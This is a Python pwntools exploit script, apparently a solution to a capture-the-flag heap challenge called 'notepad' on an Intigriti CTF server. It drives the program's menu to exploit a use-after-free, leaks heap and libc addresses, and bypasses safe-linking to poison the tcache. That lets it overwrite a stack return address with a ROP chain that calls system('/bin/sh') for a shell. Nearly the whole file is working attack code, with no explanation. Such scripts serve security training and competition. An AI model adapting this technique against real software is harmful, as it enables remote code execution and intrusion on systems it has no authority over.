#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "50"]
host, port = 'notepad.ctf.intigriti.io', 1341

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================



def malloc(size):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())

def view(idx):
    io.sendlineafter(b'>>> ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, val):
    io.sendlineafter(b'>>> ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendafter(b'data: ', val)

def free(idx):
    io.sendlineafter(b'>>> ', b'4')
    io.sendlineafter(b'index: ', str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()
    io.recvuntil("gift: ")
    stack = int(io.recvline().strip()[:-1], 16) << 4
    rip = stack - 0x10

    malloc(0x40) # Heap Leak
    malloc(0x40) # Target
    free(0)
    free(1)

    #Heap Leak
    view(0)
    io.recvuntil("]: ")
    heap_base = u64(io.recvline().strip().ljust(8, b'\x00')) << 12
    chunk_ptr2 = heap_base + 0x2e0 - 0x10
    fd = mangle(chunk_ptr2, rip)
    edit(1, p64(fd))

    malloc(0x40) # Reuse
    malloc(0x40) # Target

    malloc(0x420) # Libc
    malloc(0x40)
    free(4)

    #Libc Leak
    view(4)
    io.recvuntil("]: ")
    main_arena64 = u64(io.recvline().strip().ljust(8, b'\x00')) << 8
    libc.address = main_arena64 - (libc.sym["main_arena"] + 64)

    #Leaks
    log.info("stack address : %#x", stack)
    log.info("heap base : %#x", heap_base)
    log.info("main_arena+64 : %#x", main_arena64)
    log.info("libc address : %#x", libc.address)
    log.info("stack address : %#x", stack)

    #Shell
    rop = ROP(libc)
    RET = rop.ret.address
    BIN_SH = next(libc.search(b'/bin/sh\x00'))
    rop.call(RET)
    rop.system(BIN_SH)
    payload = flat({8 : rop.chain()})
    edit(3, payload)

    io.interactive()

    
if __name__ == '__main__':
    exploit()
